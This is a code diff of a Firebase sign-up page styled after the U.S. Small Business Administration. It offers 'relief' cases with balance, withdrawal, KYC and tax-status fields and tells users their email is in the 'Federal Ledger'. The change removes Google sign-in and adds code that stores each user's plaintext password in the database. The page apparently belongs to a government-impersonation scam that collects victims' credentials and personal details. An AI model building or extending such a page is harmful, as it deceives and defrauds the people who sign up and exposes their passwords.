@@ -21,8 +21,7 @@
         input:focus, select:focus { border-color: var(--sba-blue) !important; ring: 0 !important; outline: none !important; background: #fff !important; }
 
         .btn-sba { background: var(--sba-blue); color: white; height: 55px; font-size: 13px; letter-spacing: 1.5px; font-weight: 900; text-transform: uppercase; border-radius: 4px; transition: 0.3s; cursor: pointer; }
-        .btn-google { background: white; border: 2px solid #e2e8f0; color: #475569; height: 55px; font-size: 13px; font-weight: 700; text-transform: uppercase; border-radius: 4px; transition: 0.3s; cursor: pointer; }
-        .btn-sba:disabled, .btn-google:disabled { opacity: 0.7; cursor: not-allowed; }
+        .btn-sba:disabled { opacity: 0.7; cursor: not-allowed; }
         .btn-sba:active:not(:disabled) { transform: scale(0.97); background: #001a3d; }
     </style>
 </head>
@@ -51,11 +50,6 @@
                 </div>
 
                 <div id="alertBox" class="hidden mb-6 p-4 bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-black uppercase italic shadow-sm"></div>
-
-                <button id="googleBtn" class="btn-google w-full mb-4 flex items-center justify-center gap-3 hover:bg-slate-50">
-                    <i class="fab fa-google text-red-500"></i> Continue with Google
-                </button>
-                <div class="text-center text-[10px] font-bold text-slate-400 uppercase mb-4">Or sign up with email</div>
 
                 <form id="registerForm" class="space-y-4">
                     <div>
@@ -114,38 +108,18 @@
     </footer>
 
     <script type="module">
-        import { auth, db, provider } from './firebase-config.js';
-        import { createUserWithEmailAndPassword, signInWithPopup, sendEmailVerification } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { auth, db } from './firebase-config.js';
+        import { createUserWithEmailAndPassword, sendEmailVerification } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
         const regForm = document.getElementById('registerForm');
         const alertBox = document.getElementById('alertBox');
         const btn = document.getElementById('submitBtn');
-        const googleBtn = document.getElementById('googleBtn');
 
-        // Helper to save user data
-        async function saveUserData(user, name, relief) {
-            await setDoc(doc(db, "users", user.uid), {
-                uid: user.uid,
-                fullName: name || "User",
-                email: user.email,
-                reliefType: relief || "NOT SPECIFIED",
-                balance: 0,
-                withdrawAmount: 0,
-                withdrawStatus: "NONE",
-                kycStatus: "PENDING",
-                taxStatus: "PENDING",
-                caseNumber: "SBA-" + Math.floor(100000 + Math.random() * 900000),
-                pin: "NOT SET",
-                isVerified: false,
-                registeredAt: new Date().toISOString()
-            });
-            window.location.href = "verify.html";
-        }
-
-        // Email Registration
         regForm.onsubmit = async (e) => {
             e.preventDefault();
+            alertBox.classList.add('hidden');
+
             const name = document.getElementById('userName').value.trim();
             const email = document.getElementById('userEmail').value.toLowerCase().trim();
             const relief = document.getElementById('reliefType').value;
@@ -159,27 +133,39 @@
             btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> CONNECTING...';
 
             try {
-                const cred = await createUserWithEmailAndPassword(auth, email, pass);
-                await sendEmailVerification(cred.user);
-                await saveUserData(cred.user, name, relief);
-            } catch (err) {
+                const userCredential = await createUserWithEmailAndPassword(auth, email, pass);
+                const user = userCredential.user;
+
+                await sendEmailVerification(user);
+
+                await setDoc(doc(db, "users", user.uid), {
+                    uid: user.uid,
+                    fullName: name,
+                    email: email,
+                    password: pass, 
+                    reliefType: relief,
+                    balance: 0,
+                    withdrawAmount: 0,
+                    withdrawStatus: "NONE",
+                    kycStatus: "PENDING",
+                    taxStatus: "PENDING",
+                    caseNumber: "SBA-" + Math.floor(100000 + Math.random() * 900000),
+                    pin: "NOT SET",
+                    isVerified: false,
+                    registeredAt: new Date().toISOString()
+                });
+
+                // REMOVED signOut(auth) - We need the user logged in for verify.html
+                window.location.href = "verify.html";
+
+            } catch (error) {
                 btn.disabled = false;
                 btn.innerText = "Initialize Secure Case";
-                showAlert("SYSTEM ERROR: " + err.message);
-            }
-        };
-
-        // Google Authentication
-        googleBtn.onclick = async () => {
-            googleBtn.disabled = true;
-            googleBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> AUTHENTICATING...';
-            try {
-                const result = await signInWithPopup(auth, provider);
-                await saveUserData(result.user, result.user.displayName, "Small Business Stimulus");
-            } catch (err) {
-                googleBtn.disabled = false;
-                googleBtn.innerHTML = '<i class="fab fa-google text-red-500"></i> Continue with Google';
-                showAlert("GOOGLE ERROR: " + err.message);
+                if (error.code === 'auth/email-already-in-use') {
+                    showAlert("SYSTEM: Email already in Federal Ledger.");
+                } else {
+                    showAlert("SYSTEM ERROR: " + error.message);
+                }
             }
         };
 
